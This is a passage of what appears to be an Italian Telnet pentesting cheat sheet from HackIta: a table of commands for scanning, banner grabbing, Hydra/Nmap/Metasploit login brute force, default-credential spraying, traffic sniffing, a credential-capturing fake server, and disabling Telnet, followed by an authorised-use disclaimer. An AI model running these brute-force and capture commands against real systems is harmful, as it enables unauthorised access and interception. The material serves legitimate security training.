| Scan versione + script default | `nmap -sV -sC -p 23 <target>`                                                       |
| Banner grab                    | `nc -vn <target> 23`                                                                |
| Controllo cifratura            | `nmap --script=telnet-encryption -p 23 <target>`                                    |
| Info NTLM Windows              | `nmap --script=telnet-ntlm-info -p 23 <target>`                                     |
| Brute force Hydra              | `hydra -l admin -P rockyou.txt telnet://<target>`                                   |
| Brute force Nmap               | `nmap --script=telnet-brute --script-args userdb=u.txt,passdb=p.txt -p 23 <target>` |
| Brute force Metasploit         | `use auxiliary/scanner/telnet/telnet_login`                                         |
| Credenziali di default         | `hydra -C telnet-betterdefaultpasslist.txt telnet://<target>`                       |
| Login manuale                  | `telnet <target>`                                                                   |
| Porta non standard             | `telnet <target> 2323`                                                              |
| Test porta                     | `telnet <target> <porta>`                                                           |
| Test porta Windows             | `Test-NetConnection -ComputerName <target> -Port 23`                                |
| Uscita da Telnet               | `Ctrl + ]` poi `quit`                                                               |
| Abilita client Windows         | `dism /online /Enable-Feature /FeatureName:TelnetClient`                            |
| Cattura traffico               | `tcpdump -i eth0 -n 'port 23' -w telnet.pcap`                                       |
| Leggi lo stream                | `tshark -r telnet.pcap -q -z follow,tcp,ascii,0`                                    |
| Server falso                   | `use auxiliary/server/capture/telnet`                                               |
| Cerca CVE                      | `searchsploit telnetd`                                                              |
| Disabilita Telnet (systemd)    | `systemctl disable --now telnet.socket`                                             |

***

> **Disclaimer:** Tutti i comandi e le tecniche descritte in questo articolo sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine virtuali CTF come Metasploitable/HackTheBox/TryHackMe e penetration test con autorizzazione scritta del proprietario del sistema. L'accesso non autorizzato a sistemi informatici è un reato penale in Italia (art. 615-ter c.p.) e nella maggior parte delle giurisdizioni internazionali. L'intercettazione di comunicazioni altrui senza consenso è reato (art. 617-quater c.p.). L'autore e HackIta declinano ogni responsabilità per usi impropri di queste informazioni. Per ulteriori dettagli sul protocollo Telnet, consultare RFC 854 ([https://www.rfc-editor.org/rfc/rfc854.html](https://www.rfc-editor.org/rfc/rfc854.html)) e RFC 855 ([https://www.rfc-editor.org/rfc/rfc855.html](https://www.rfc-editor.org/rfc/rfc855.html)).

Vuoi supportare HackIta? Visita [https://hackita.it/supporto](https://hackita.it/supporto/) per donazioni. Per penetration test professionali e formazione 1:1, scopri [https://hackita.it/servizi](https://hackita.it/servizi/).
